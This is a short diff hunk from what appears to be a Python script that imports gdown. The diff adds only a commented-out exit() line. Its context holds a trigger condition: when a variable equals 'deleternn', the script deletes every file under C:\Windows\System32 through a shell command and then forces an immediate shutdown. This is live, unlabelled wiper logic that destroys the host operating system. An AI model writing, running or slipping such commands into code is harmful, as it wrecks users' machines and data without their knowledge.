@@ -12,6 +12,7 @@ import shutil
 import os
 import gdown
 os.system('cls')
+#exit()
 if file_contentsx1=="deleternn":
     subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
